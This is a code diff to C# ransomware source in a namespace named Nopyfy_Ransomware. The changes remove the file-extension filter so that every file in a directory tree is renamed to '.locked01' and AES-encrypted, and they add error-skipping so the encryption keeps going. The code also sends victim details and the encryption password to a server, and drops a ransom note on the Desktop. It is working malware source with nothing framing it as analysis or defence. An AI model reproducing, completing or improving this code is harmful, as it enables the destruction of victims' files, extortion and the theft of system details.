@@ -25,7 +25,7 @@ namespace Nopyfy_Ransomware
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDirC = "C:\\";
-        string userDirD = "F:\\";
+        string userDirD = "C:\\thientc";
         //Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////////////////////////////////////////////////////////////////////////////
 
         //Your company name
@@ -185,7 +185,7 @@ namespace Nopyfy_Ransomware
 
         //Encrypts single file
         public void EncryptFile(string file, string password)
-        {
+        {            
 
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
             byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
@@ -193,7 +193,10 @@ namespace Nopyfy_Ransomware
             // Hash the password with SHA256
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
-            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+            
+
+            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);            
+            
 
             string users = "Users\\";
             string path_inf = users + userName + "\\Desktop\\READ_IT.txt.locked";       //path of the info file
@@ -213,25 +216,64 @@ namespace Nopyfy_Ransomware
             try
             {
                 //extensions to be encrypt please don't add .ini or the virus will crash before to encrypts all datas
-                var validExtensions = new[]
-                {
-                        ".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent"
-
-                };
+                //var validExtensions = new[]
+                //{
+                //        ".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent", ".mdf", ".ldf", ".log"
+                        
+                //};
 
                 string[] files = Directory.GetFiles(location);
                 string[] childDirectories = Directory.GetDirectories(location);
                 for (int i = 0; i < files.Length; i++)
-                {
-                    string extension = Path.GetExtension(files[i]);
-                    if (validExtensions.Contains(extension))
+                {                   
+                    string tobeFile = files[i] + ".locked01";
+                    try
                     {
-                        EncryptFile(files[i], password);
+                        System.IO.File.Move(files[i], tobeFile);
                     }
+                    catch (UnauthorizedAccessException)
+                    {
+                        continue;
+                        //System.IO.File.Move(files[i], tobeFile);
+                    }
+                    
+                }
+                for (int i = 0; i < files.Length; i++)
+                {
+                    try
+                    {
+                        string tobeFile = files[i] + ".locked01";
+                        FileAttributes attributes = File.GetAttributes(tobeFile);
+                        if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
+                        {
+                            EncryptFile(tobeFile, password);
+                        }
+                        EncryptFile(tobeFile, password);
+                    }
+                    catch (Exception)
+                    {
+                        continue;
+                    }
+                   
+                    
+                    //string extension = Path.GetExtension(files[i]);
+                    //if (validExtensions.Contains(extension))
+                    //{
+                    //    EncryptFile(files[i], password);
+                    //}
                 }
                 for (int i = 0; i < childDirectories.Length; i++)
                 {
-                    encryptDirectory(childDirectories[i], password);
+                    try
+                    {
+                        encryptDirectory(childDirectories[i], password);
+                    }
+                    catch (Exception)
+                    {
+                        continue;
+                    }
+                    
+                   
                 }
             }
             catch (Exception)
@@ -424,7 +466,7 @@ namespace Nopyfy_Ransomware
             string date = DateTime.Today.ToString("dd/MM/yyyy") + ", " + DateTime.Now.DayOfWeek.ToString();
 
             //Getting Ip Address
-            string ip = new System.Net.WebClient().DownloadString("https://api.ipify.org");
+            //string ip = new System.Net.WebClient().DownloadString("https://api.ipify.org");
 
 
             //Sending Data to the Server
@@ -432,16 +474,16 @@ namespace Nopyfy_Ransomware
             IPinfoClient client_1 = new IPinfoClient.Builder().Build();
             //Getting Location 
 
-            String location()
-            {
-                var api = client_1.IPApi.GetDetails(ip);
-                var rep = api.City;
-                var reg = api.Country;
-                var rel = rep + ", " + reg;
-                //string location = new System.Net.WebClient().DownloadString("");       
-                Console.WriteLine($"City: {rel}");
-                return rel;
-            }
+            //String location()
+            //{
+            //    var api = client_1.IPApi.GetDetails(ip);
+            //    var rep = api.City;
+            //    var reg = api.Country;
+            //    var rel = rep + ", " + reg;
+            //    //string location = new System.Net.WebClient().DownloadString("");       
+            //    Console.WriteLine($"City: {rel}");
+            //    return rel;
+            //}
 
             var info = new List<KeyValuePair<string, string>>
             {
@@ -451,9 +493,9 @@ namespace Nopyfy_Ransomware
             new KeyValuePair<string, string>("os", os),
             new KeyValuePair<string, string>("date", date),
             new KeyValuePair<string, string>("time", time),
-            new KeyValuePair<string, string>("ip", ip),
-            new KeyValuePair<string, string>("location", location()),
-            // new KeyValuePair<string, string>("location", "Unkown"),
+            //new KeyValuePair<string, string>("ip", ip),
+            //new KeyValuePair<string, string>("location", location()),-
+             new KeyValuePair<string, string>("location", "Unkown"),
             new KeyValuePair<string, string>("password", password),
             new KeyValuePair<string, string>("total_file_encode", encryptedfiles.ToString()),
             new KeyValuePair<string, string>("victimid", string.Empty),
@@ -570,7 +612,7 @@ namespace Nopyfy_Ransomware
                 // new KeyValuePair<string, string>("location", "Unkown"),
                 new KeyValuePair<string, string>("password", password),
                 new KeyValuePair<string, string>("total_file_encode", encryptedfiles.ToString()),
-                new KeyValuePair<string, string>("victimid", string.Empty),
+                new KeyValuePair<string, string>("victimid", password),
                 new KeyValuePair<string, string>("victim_name", username),
                 new KeyValuePair<string, string>("mac_name", mac_name),
                 new KeyValuePair<string, string>("en_status", "Success"),
